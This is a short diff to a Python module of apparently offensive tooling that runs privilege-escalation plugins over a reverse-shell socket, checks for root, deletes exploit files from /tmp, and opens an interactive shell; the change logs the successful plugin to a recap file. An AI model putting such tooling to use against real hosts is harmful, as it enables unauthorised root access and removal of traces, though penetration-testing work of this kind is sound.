@@ -2,7 +2,7 @@ import os
 import rs_client
 from time import sleep
 
-def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell) -> None:
+def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell, compromission_recap_file_name: str) -> None:
     """
     Run all available privesc plugins
     """
@@ -31,10 +31,14 @@ def load_all_plugins(sock: rs_client.Socket, shell: rs_client.Shell) -> None:
             sleep(2)
             if rsh.file_exists('/tmp/valid_root') == True:
                 print('[+] Privesc exploit worked !')
+                if compromission_recap_file_name:
+                    with open(compromission_recap_file_name, 'a') as c:
+                        c.write('Plugin used for priviledge escalation : {}'.format(f.split('/')[-1][:-3]))
                 sock.send('rm /tmp/valid_root\n')
                 sock.send('rm /tmp/exploit{0}{1}\n'.format(counter, ext))
                 shell.interact()
                 sock.close()
+                print('before if')
             else:
                 print("")
                 sock.send('rm /tmp/exploit*\n') 
